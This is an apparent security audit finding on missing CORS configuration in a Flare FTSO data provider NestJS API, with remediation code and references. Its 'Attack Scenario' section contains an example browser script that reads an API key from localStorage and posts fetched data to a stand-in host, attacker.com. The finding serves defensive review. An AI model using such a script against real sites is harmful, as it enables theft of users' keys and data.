# Vulnerability #5: Missing CORS Configuration

## Severity
**MEDIUM** (Context-Dependent)

## Location
- **File:** `apps/ftso-data-provider/src/main.ts`
- **Lines:** 8-41

## Description
The FTSO Data Provider API does not configure Cross-Origin Resource Sharing (CORS) policies. This means:
1. If the server allows all origins by default, it's vulnerable to CSRF attacks
2. If the server blocks all origins by default, legitimate cross-origin clients may be unable to access the API
3. The security posture is undefined and may change based on deployment environment

## Vulnerable Code
```typescript
async function bootstrap() {
  let logLevels: LogLevel[] = ["log"];
  if (process.env.LOG_LEVEL == "debug") {
    logLevels = ["verbose"];
  }

  const app = await NestFactory.create(FtsoDataProviderModule, { logger: logLevels });
  app.enableShutdownHooks();
  app.useGlobalInterceptors(new BigIntInterceptor());
  app.use(helmet());  // Helmet is present but CORS is not configured

  // ← Missing: app.enableCors({ ... })

  const basePath = process.env.DATA_PROVIDER_CLIENT_BASE_PATH ?? "";
  // ...
  await app.listen(PORT);
}
```

## Impact

### If Default Allows All Origins:
1. **Cross-Site Request Forgery (CSRF):** Malicious websites can make requests on behalf of users
2. **API Key Leakage:** If API keys are stored in browser localStorage, malicious sites could extract them
3. **Data Exposure:** Sensitive data could be accessed from untrusted origins

### If Default Blocks All Origins:
1. **Broken Functionality:** Legitimate web clients cannot access the API
2. **Integration Issues:** Frontend applications cannot communicate with the backend

## Attack Scenario (CSRF)
```html
<!-- Malicious website: evil.com -->
<script>
// If victim has API key in localStorage or cookies
const apiKey = localStorage.getItem('ftso-api-key');

// Make unauthorized request to data provider
fetch('http://ftso-provider:3100/submit1/1000/0x1234...', {
  headers: {
    'X-API-KEY': apiKey
  }
})
.then(response => response.json())
.then(data => {
  // Exfiltrate data to attacker's server
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

## Proof of Concept
```bash
# Test CORS from different origin
curl -H "Origin: http://evil.com" \
     -H "X-API-KEY: 12345" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS \
     http://localhost:3100/data-abis

# Check response headers for:
# - Access-Control-Allow-Origin
# - Access-Control-Allow-Methods
# - Access-Control-Allow-Headers
```

## Remediation

### Option 1: Strict CORS (Recommended for Private API)
```typescript
// main.ts
app.enableCors({
  origin: false,  // Block all cross-origin requests
  credentials: false,
});
```

### Option 2: Whitelist Specific Origins
```typescript
// main.ts
const allowedOrigins = [
  'https://flare-network.com',
  'https://app.flare.network',
  process.env.ALLOWED_ORIGIN,  // From environment
].filter(Boolean);

app.enableCors({
  origin: (origin, callback) => {
    // Allow requests with no origin (like mobile apps, curl, Postman)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET'],  // Only allow GET requests
  allowedHeaders: ['X-API-KEY', 'Content-Type'],
  credentials: false,  // Don't allow credentials
  maxAge: 3600,  // Cache preflight requests for 1 hour
});
```

### Option 3: Dynamic Based on Deployment
```typescript
// configuration.ts
export default () => {
  const config = {
    // ... existing config
    corsEnabled: process.env.CORS_ENABLED === 'true',
    corsOrigins: process.env.CORS_ORIGINS?.split(',') || [],
  };
  return config;
};

// main.ts
const configService = app.get(ConfigService);
const corsEnabled = configService.get<boolean>('corsEnabled');
const corsOrigins = configService.get<string[]>('corsOrigins');

if (corsEnabled) {
  app.enableCors({
    origin: corsOrigins.length > 0 ? corsOrigins : false,
    methods: ['GET'],
    allowedHeaders: ['X-API-KEY', 'Content-Type'],
    credentials: false,
  });
}
```

### Additional Security with Helmet
```typescript
// The application already uses helmet(), ensure it has proper CSP
app.use(helmet({
  crossOriginResourcePolicy: { policy: "same-origin" },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: "same-origin" },
}));
```

## Recommended Configuration
Since this appears to be a backend API service (not meant for browser access):
```typescript
// Disable CORS entirely - API should only be accessed by authorized servers
app.enableCors({
  origin: false,
  credentials: false,
});
```

## Notes
- The severity is MEDIUM because:
  - If this is a backend-to-backend API (not meant for browsers), CORS is less critical
  - The API requires API key authentication, which provides some protection
  - However, the undefined security posture is still a concern

## References
- OWASP: [CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html)
- MDN: [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- CWE-346: Origin Validation Error
- [NestJS CORS Documentation](https://docs.nestjs.com/security/cors)

## Verification Status
✅ **CONFIRMED** - No `enableCors()` call found in `apps/ftso-data-provider/src/main.ts`
